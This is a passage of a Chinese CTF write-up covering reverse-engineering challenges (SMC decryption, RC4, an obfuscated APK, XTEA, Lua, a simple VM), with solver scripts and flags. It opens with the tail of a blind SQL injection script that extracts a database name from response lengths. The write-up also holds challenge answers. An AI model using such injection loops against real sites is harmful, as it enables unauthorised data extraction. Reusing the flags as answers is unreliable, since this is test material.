        url&#x3D;url_template.format(j,i_ascii)
        result&#x3D;requests.get(url)
        length&#x3D;len(result.text)
        if length&gt;300:
            database_name+&#x3D;i
            print(database_name)
            break</code></pre>

<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="RealEzRE"><a href="#RealEzRE" class="headerlink" title="RealEzRE"></a>RealEzRE</h2><h3 id="1-SMC"><a href="#1-SMC" class="headerlink" title="1. SMC"></a>1. SMC</h3><p>进入主函数后发现几个被加密后的字符串，通过IDA的Findcrypt 插件发现Base64的表，猜测这些字符串是经过Base64编码的，解密后得知是这里是一些提示信息</p>
<p><img src="http://cdn.jev0n.com//pviYQEuT7nuD5Ce5.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>下面的操作是对关键函数区块进行smc解密操作，首先通过sub_401B80函数找到要解密的区块始末地址和大小</p>
<p><img src="http://cdn.jev0n.com//HNq1zt20TYye2PVz.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>目标区块和0x67异或解密</p>
<p><img src="http://cdn.jev0n.com//a7x2sM1wuH3xwmd9.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p><img src="http://cdn.jev0n.com//0oCOXWt6j0BB8Z2b.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>IDC 脚本</p>
<pre><code class="hljs c++"><span class="hljs-keyword">auto</span> key = <span class="hljs-number">0x67</span>;
<span class="hljs-keyword">auto</span> from = <span class="hljs-number">0x401cc0</span> + <span class="hljs-number">0x20</span>;
<span class="hljs-keyword">auto</span> <span class="hljs-built_in">size</span> = <span class="hljs-number">0x359</span>;
<span class="hljs-keyword">auto</span> i, x; 
<span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">size</span>; ++i ) 
&#123; 
    x = Byte(from); 
    x = (x^(key + (i &amp; <span class="hljs-number">0xF</span>))); 
    PatchByte(from,x); 
    from = from + <span class="hljs-number">1</span>;
&#125; 
Message(<span class="hljs-string">&quot;\n Success \n&quot;</span>);
​</code></pre>

<h3 id="2-关键函数"><a href="#2-关键函数" class="headerlink" title="2. 关键函数"></a>2. 关键函数</h3><p>通过一些操作还原了关键函数，查看伪C代码后发现输入的字符串加密后和特定数值分三次比较</p>
<p><img src="http://cdn.jev0n.com//MhehI1X8DJXKISOV.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<h3 id="3-加密函数"><a href="#3-加密函数" class="headerlink" title="3. 加密函数"></a>3. 加密函数</h3><p><img src="https://uploader.shimo.im/f/Pvyfe6IrtHAzpBth.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
<p>通过分析知道这是个RC4加密</p>
<p><img src="http://cdn.jev0n.com//ZggJEJUbk518mbCM.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>解密脚本</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
​
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rc4</span></span>
<span class="hljs-class">&#123;</span>
    <span class="hljs-keyword">int</span> x, y, m[<span class="hljs-number">256</span>];
&#125;;
​
<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>     uint8;
​
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    uint8 flag[<span class="hljs-number">100</span>] = &#123; <span class="hljs-number">0</span> &#125;;
    uint8 cmp[] = &#123; <span class="hljs-number">0x12</span>,<span class="hljs-number">0xa7</span>,<span class="hljs-number">0xf5</span>,<span class="hljs-number">0xde</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0xe6</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0xbf</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x98</span>,<span class="hljs-number">0xfe</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0xdd</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0xb6</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0xd4</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0xfe</span>,<span class="hljs-number">0xbc</span> &#125;;
    BYTE  key[<span class="hljs-number">8</span>] = &#123; <span class="hljs-number">0x01</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xEF</span> &#125;;
    <span class="hljs-keyword">int</span> i, j, k, a,b;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rc4</span> <span class="hljs-title">s</span>;</span>
    <span class="hljs-keyword">int</span> length = <span class="hljs-number">8</span>;
    <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));
    s.x = <span class="hljs-number">0</span>;
    s.y = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)
        s.m[i] = i;
    j = k = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)
    &#123;
        a = s.m[i];
        j = (uint8)(j + a + key[k]);
        s.m[i] = s.m[j]; 
        s.m[j] = a;
        <span class="hljs-keyword">if</span> (++k &gt;= length)
            k = <span class="hljs-number">0</span>;
    &#125;
​
    length = <span class="hljs-number">32</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length; i++)
    &#123;
        s.x = (uint8)(s.x + <span class="hljs-number">1</span>);
        a = s.m[s.x];
        s.y = (uint8)(s.y + a);
        s.m[s.x] = b = s.m[s.y];
        s.m[s.y] = a;
        flag[i] = cmp[i] ^ s.m[(uint8)(a + b)];
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag&#123;%s&#125;&quot;</span>, flag);
&#125;</code></pre>


<h2 id="Stangeapk"><a href="#Stangeapk" class="headerlink" title="Stangeapk"></a>Stangeapk</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>使用jeb3.0打开apk发现字符串被加密了</p>
<p><img src="https://images-cdn.shimo.im/NsSEoVt9TXvm18Gq__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>查看加密函数发现为异或+base64加密 ，编写解密函数</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Base64;
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringFog</span> </span>&#123;
	<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] xor(<span class="hljs-keyword">byte</span>[] data, String key) &#123;     <span class="hljs-comment">//异或算法</span>
	    <span class="hljs-keyword">int</span> len = data.length;
	    <span class="hljs-keyword">int</span> lenKey = key.length();
	    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;
	    <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;
	    <span class="hljs-keyword">while</span> (i &lt; len) &#123;
	        <span class="hljs-keyword">if</span> (j &gt;= lenKey) &#123;
	            j = <span class="hljs-number">0</span>;
	        &#125;
	        data[i] = (<span class="hljs-keyword">byte</span>) (data[i] ^ key.charAt(j));
	        i++;
	        j++;
	    &#125;
	    <span class="hljs-keyword">return</span> data;
	&#125;
	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">encode</span><span class="hljs-params">(String data, String key)</span> </span>&#123;
	    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(xor(data.getBytes(), key)));
	    <span class="hljs-comment">//调用base64加密包</span>
	&#125;
	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">decode</span><span class="hljs-params">(String data, String key)</span> </span>&#123;
	    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String(xor(Base64.getDecoder().decode(data), key));
	    <span class="hljs-comment">//调用base64解密包</span>
	&#125;</code></pre>

<p>得到关键字符串</p>
<pre><code class="hljs java"><span class="hljs-keyword">if</span>(!name.equals(<span class="hljs-string">&quot;WLLM&quot;</span>)) &#123;
                Toast.makeText(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;please input your name&quot;</span>, <span class="hljs-number">0</span>).show();
                <span class="hljs-keyword">return</span>;
            &#125;
<span class="hljs-keyword">if</span>(!password.equals(<span class="hljs-string">&quot;welcome_to_SWPUCtf&quot;</span>)) &#123;
                Toast.makeText(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;please input your password&quot;</span>, <span class="hljs-number">0</span>).show();
                <span class="hljs-keyword">return</span>;
            &#125;
HttpURLConnection connection = (HttpURLConnection)<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://121.196.219.16:8080/ForAndroid/mustLogin?logname=1&amp;password=1&quot;</span>).openConnection();</code></pre>

<p>可以发现这是一个http请求，输入账号密码或者直接访问url均可达到目的<br>得到服务器返回的字符串：</p>
<p><img src="https://images-cdn.shimo.im/I7MKKE2GSURW5GOV__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>根据url下载附件realapp</p>
<blockquote>
<p>ps：jeb 3.9及以后会自动解密字符串</p>
</blockquote>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>反编译apk</p>
<p>该apk验证流程为:</p>
<p>对输入内容进行凯撒加密，其中凯撒key被hook了，返回值为18，传入到native层，并对字符串进行异或操作，然后和值进行比较</p>
<p>hook代码：</p>
<p><img src="http://cdn.jev0n.com//2jdDNB54Z7IQsv1h.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p><img src="http://cdn.jev0n.com//rQ2HnjIWtwOBroox.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>其中几个重要参数：</p>
<pre><code class="hljs plain">比较字符串：&#123;122,125,119,121,71,104,84,85,79,99,13,79,99,125,99,107,78,12,110,91,99,122,13,12,91,65&#125;
异或的值：getInt()函数返回值，一个xtea算法的解密，其中v为&#123;(unsigned int)-355481616,(unsigned int)1654711569&#125;，key为&#123;1,2,3,4&#125;，返回值为v[0]</code></pre>

<p>通过动态调试或者frida hook,或者观察log日志(出题人忘删除log了,难过.png)<br>可以得到 v[0]=40</p>
<p>脚本如下：</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span>
<span class="hljs-keyword">char</span> small_letter[<span class="hljs-number">26</span>] = &#123; <span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span> &#125;;
<span class="hljs-keyword">char</span> big_letter[<span class="hljs-number">26</span>] = &#123; <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;J&#x27;</span>,<span class="hljs-string">&#x27;K&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;Q&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;X&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Z&#x27;</span> &#125;;
<span class="hljs-keyword">char</span> result[<span class="hljs-number">1000</span>];
<span class="hljs-keyword">int</span> p;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>* v, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>* key)</span> </span>&#123;
	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> l = v[<span class="hljs-number">0</span>], r = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>, delta = <span class="hljs-number">0x9e3779b9</span>;
	sum = delta * <span class="hljs-number">32</span>;
	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;
		r -= (((l &lt;&lt; <span class="hljs-number">4</span>) ^ (l &gt;&gt; <span class="hljs-number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);
		sum -= delta;
		l -= (((r &lt;&lt; <span class="hljs-number">4</span>) ^ (r &gt;&gt; <span class="hljs-number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);
	&#125;
	v[<span class="hljs-number">0</span>] = l;
	v[<span class="hljs-number">1</span>] = r;
&#125;
<span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">carse</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* estr,<span class="hljs-keyword">int</span> <span class="hljs-built_in">move</span>)</span> </span>&#123;
	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(estr); i++)
	&#123;
		<span class="hljs-keyword">if</span>(estr[i]&gt;=<span class="hljs-string">&#x27;A&#x27;</span>&amp;&amp;estr[i]&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>)
        &#123;
            p=((estr[i]-<span class="hljs-string">&#x27;A&#x27;</span>)- <span class="hljs-built_in">move</span>);
            <span class="hljs-keyword">while</span>(p&lt;<span class="hljs-number">0</span>)p+=<span class="hljs-number">26</span>;
            result[i]=big_letter[p];
        &#125;
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (estr[i]&gt;=<span class="hljs-string">&#x27;a&#x27;</span>&amp;&amp;estr[i]&lt;=<span class="hljs-string">&#x27;z&#x27;</span>)
        &#123;
            p=((estr[i]-<span class="hljs-string">&#x27;a&#x27;</span>)- <span class="hljs-built_in">move</span>);
            <span class="hljs-keyword">while</span>(p&lt;<span class="hljs-number">0</span>)p+=<span class="hljs-number">26</span>;
            result[i]=small_letter[p];
        &#125;
        <span class="hljs-keyword">else</span> result[i]= estr[i];
	&#125;
	<span class="hljs-keyword">return</span> result;
&#125;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-comment">//test</span>
	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v[<span class="hljs-number">2</span>] = &#123; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">-355481616</span>,(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">1654711569</span> &#125;, key[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> &#125;;
	<span class="hljs-keyword">char</span> *FK = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">50</span>);
	<span class="hljs-keyword">char</span> *b = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">50</span>);
	<span class="hljs-keyword">int</span> c[] = &#123; <span class="hljs-number">122</span>,<span class="hljs-number">125</span>,<span class="hljs-number">119</span>,<span class="hljs-number">121</span>,<span class="hljs-number">71</span>,<span class="hljs-number">104</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">79</span>,<span class="hljs-number">99</span>,<span class="hljs-number">13</span>,<span class="hljs-number">79</span>,<span class="hljs-number">99</span>,<span class="hljs-number">125</span>,<span class="hljs-number">99</span>,<span class="hljs-number">107</span>,<span class="hljs-number">78</span>,<span class="hljs-number">12</span>,<span class="hljs-number">110</span>,<span class="hljs-number">91</span>,<span class="hljs-number">99</span>,<span class="hljs-number">122</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">91</span>,<span class="hljs-number">65</span> &#125;;
	decrypt(v, key);
	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++) &#123;
		FK[i] = c[i] ^ v[<span class="hljs-number">0</span>];
	&#125;
	b = carse(FK, <span class="hljs-number">18</span>);
	<span class="hljs-built_in">string</span> eflag=b;
	<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;flag is:&quot;</span> &lt;&lt; eflag.substr(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>);
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>



<h2 id="where-is-temp"><a href="#where-is-temp" class="headerlink" title="where_is_temp"></a>where_is_temp</h2><p>本题是通过C语言来调用lua脚本，实现flag的获取与验证操作，所以关键点就是要能提取出原始的lua脚本进行分析。</p>
<p>首先是C语言部分比较简单，就是一些垃圾的反调试，然后就是文件操作，将文件释放到临时文件夹中，拿到了这个脚本发现是luac脚本，luac文件转lua文件其实可以选择的工具很多，我自己选择的是luadec，值得一提的是luadec需要确定具体的lua使用的版本，而这可以通过ida查看程序的字符串就可以发现是lua5.3，这样我们基本就能完整还原出lua文件了。</p>
<p>lua脚本中就是一些简单的换位，异或，查表操作等，当然最后两位比较特殊，看似有多解，但根据费马大定理可得其实n只能等于2，而m就等于40，当然熟悉勾三股四弦五的话很容易也可以猜到。</p>
<p>flag：luA1s_(2_Easy_To_y0u_!!!</p>
<h2 id="简陋的vm"><a href="#简陋的vm" class="headerlink" title="简陋的vm"></a>简陋的vm</h2><p>这道题其实就是一个简单的使用c语言模拟执行的vm，本身并没有做什么处理，只需要找到分发器的位置，再将每一条handle解析出来就能还原汇编。</p>
<p>首先是分发器，利用的是push/ret的方式调用的，获取需要call的函数地址，将参数与返回地址依次入栈，最后压入跳转地址ret就可以了，所以需要动态调试一下。</p>
<pre><code class="hljs asm">add_call &#x3D; call_list[vm_call];
__asm
&#123;
 push i;
 sub esp, 0x4;
 mov eax, v_ret;
 mov dword ptr ss : [esp] , eax;
 push add_call;
 ret;
v_ret:
 mov i, eax;
 &#125;</code></pre>

<p>接下来就是解析每个handle，原本的汇编指令应该如下所示：</p>
<pre><code class="hljs c++"><span class="hljs-keyword">signed</span> opcode[<span class="hljs-number">219</span>] = &#123;
	op_mov, <span class="hljs-number">6</span>, op_ebp, op_esp,
	op_sub, op_esp, <span class="hljs-number">54</span>,
	op_push, op_esi, 							<span class="hljs-comment">//2 push esi</span>
	op_push, op_edi, 							<span class="hljs-comment">//2 push edi</span>
	op_mov, <span class="hljs-number">4</span>, op_ecx, <span class="hljs-number">9</span>,						<span class="hljs-comment">//4 mov ecx,0x9</span>
	op_mov, <span class="hljs-number">0x10</span>, op_esi, 						<span class="hljs-comment">//3 mov esi,Project2.00C620F8</span>
	op_lea, op_edi, <span class="hljs-number">-0x50</span>,						<span class="hljs-comment">//3 lea edi,dword ptr ss:[ebp-0x50]</span>
	op_rep_movs,		    					<span class="hljs-comment">//1 rep movs dword ptr es:[edi],dword ptr ds:[esi]</span>
	op_mov, <span class="hljs-number">5</span>, <span class="hljs-number">-0x54</span>, <span class="hljs-number">0</span>,						<span class="hljs-comment">//4 mov dword ptr ss:[ebp-0x54],0x0</span>
	op_jmp,	<span class="hljs-number">12</span>,									<span class="hljs-comment">//2 jmp short Project2.00C61033</span>
	op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>
	op_add, op_eax, <span class="hljs-number">0x1</span>,						<span class="hljs-comment">//3 add eax,0x1</span>
	op_mov, <span class="hljs-number">5</span>, <span class="hljs-number">-0x54</span>, op_eax,					<span class="hljs-comment">//4 mov dword ptr ss:[ebp-0x54],eax</span>
	op_cmp, <span class="hljs-number">-0x54</span>, <span class="hljs-number">0x24</span>,						<span class="hljs-comment">//3 cmp dword ptr ss:[ebp-0x54],0x24</span>
	op_jge, <span class="hljs-number">89</span>,									<span class="hljs-comment">//2 jge Project2.00C610D6</span>
	op_mov, <span class="hljs-number">3</span>, op_ecx, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov ecx,dword ptr ss:[ebp-0x54]</span>
	op_and, op_ecx, <span class="hljs-number">0x80000001</span>,					<span class="hljs-comment">//3 and ecx,0x80000001</span>
	op_jns, <span class="hljs-number">8</span>,									<span class="hljs-comment">//2 jns short Project2.00C6104D</span>
	op_dec, op_ecx,								<span class="hljs-comment">//2 dec ecx</span>
	op_or, op_ecx, <span class="hljs-number">-0x2</span>,						<span class="hljs-comment">//3 or ecx,-0x2</span>
	op_inc, op_ecx,								<span class="hljs-comment">//2 inc ecx</span>
	op_test, op_ecx, op_ecx,					<span class="hljs-comment">//3 test ecx,ecx</span>
	op_je, <span class="hljs-number">35</span>,									<span class="hljs-comment">//2 je short Project2.00C6106F</span>
	op_mov, <span class="hljs-number">3</span>, op_edx, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov edx,dword ptr ss:[ebp-0x54]</span>
	op_mov, <span class="hljs-number">0x10B</span>, op_eax, op_edx, <span class="hljs-number">-0x50</span>,		<span class="hljs-comment">//5 movzx eax,byte ptr ss:[ebp+edx-0x50]</span>
	op_add, op_eax, <span class="hljs-number">0x5</span>,						<span class="hljs-comment">//3 add eax,0x5</span>
	op_mov, <span class="hljs-number">4</span>, op_ecx, <span class="hljs-number">0x68</span>,						<span class="hljs-comment">//4 mov ecx,0x68</span>
	op_sub, <span class="hljs-number">3</span>, op_ecx, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 sub ecx,dword ptr ss:[ebp-0x54]</span>
	op_xor, op_eax, op_ecx,						<span class="hljs-comment">//3 xor eax,ecx</span>
	op_mov, <span class="hljs-number">3</span>, op_edx, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov edx,dword ptr ss:[ebp-0x54]</span>
	op_mov, <span class="hljs-number">0x10D</span>, op_edx, <span class="hljs-number">-0x2c</span>, op_eax,		<span class="hljs-comment">//5 mov byte ptr ss:[ebp+edx-0x2C],al</span>
	op_jmp,	<span class="hljs-number">32</span>,									<span class="hljs-comment">//2 jmp short Project2.00C61089</span>
	op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>
	op_mov, <span class="hljs-number">0x10B</span>, op_ecx, op_eax, <span class="hljs-number">-0x50</span>,		<span class="hljs-comment">//5 movzx ecx,byte ptr ss:[ebp+eax-0x50]</span>
	op_sub, op_ecx, <span class="hljs-number">0x3</span>,						<span class="hljs-comment">//3 sub ecx,0x3</span>
	op_mov, <span class="hljs-number">3</span>, op_edx, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov edx,dword ptr ss:[ebp-0x54]</span>
	op_add, op_edx, <span class="hljs-number">0x67</span>,						<span class="hljs-comment">//3 add edx,0x67</span>
	op_xor, op_ecx, op_edx,						<span class="hljs-comment">//3 xor ecx,edx</span>
	op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>
	op_mov, <span class="hljs-number">0x10D</span>, op_eax, <span class="hljs-number">-0x2c</span>, op_ecx, 		<span class="hljs-comment">//5 mov byte ptr ss:[ebp+eax-0x2C],cl</span>
	op_jmp,	<span class="hljs-number">-103</span>,								<span class="hljs-comment">//2 jmp</span>
	op_mov, <span class="hljs-number">5</span>, <span class="hljs-number">-0x54</span>, <span class="hljs-number">0x0</span>,						<span class="hljs-comment">//4 mov dword ptr ss:[ebp-0x54],0x0</span>
	op_jmp,	<span class="hljs-number">12</span>,									<span class="hljs-comment">//2 jmp short Project2.00C6109B</span>
	op_mov, <span class="hljs-number">3</span>, op_ecx, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov ecx,dword ptr ss:[ebp-0x54]</span>
	op_add, op_ecx, <span class="hljs-number">0x1</span>,						<span class="hljs-comment">//3 add ecx,0x1</span>
	op_mov, <span class="hljs-number">5</span>, <span class="hljs-number">-0x54</span>, op_ecx,					<span class="hljs-comment">//4 mov dword ptr ss:[ebp-0x54],ecx</span>
	op_cmp, <span class="hljs-number">-0x54</span>, <span class="hljs-number">0x12</span>,						<span class="hljs-comment">//3 cmp dword ptr ss:[ebp-0x54],0x12</span>
	op_jge,	<span class="hljs-number">59</span>,									<span class="hljs-comment">//2 jge short Project2.00C610D1</span>
	op_mov, <span class="hljs-number">3</span>, op_edx, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov edx,dword ptr ss:[ebp-0x54]</span>
	op_add, op_edx, <span class="hljs-number">0x32</span>,						<span class="hljs-comment">//3 add edx,0x32</span>
	op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>
	op_mov, <span class="hljs-number">0x10B</span>, op_ecx, op_eax, <span class="hljs-number">-0x2c</span>, 		<span class="hljs-comment">//5 movzx ecx,byte ptr ss:[ebp+eax-0x2C]</span>
	op_xor, op_ecx, op_edx,						<span class="hljs-comment">//3 xor ecx,edx</span>
	op_mov, <span class="hljs-number">3</span>, op_edx, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov edx,dword ptr ss:[ebp-0x54]</span>
	op_mov, <span class="hljs-number">0x10D</span>, op_edx, <span class="hljs-number">-0x2c</span>, op_ecx,		<span class="hljs-comment">//5 mov byte ptr ss:[ebp+edx-0x2C],cl</span>
	op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>
	op_add, op_eax, <span class="hljs-number">0x23</span>,						<span class="hljs-comment">//3 add eax,0x23</span>
	op_mov, <span class="hljs-number">3</span>, op_ecx, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov ecx,dword ptr ss:[ebp-0x54]</span>
	op_mov, <span class="hljs-number">0x10B</span>, op_edx, op_ecx, <span class="hljs-number">-0x1a</span>,		<span class="hljs-comment">//5 movzx edx,byte ptr ss:[ebp+ecx-0x1A]</span>
	op_xor, op_edx, op_eax,						<span class="hljs-comment">//3 xor edx,eax</span>
	op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,					<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>
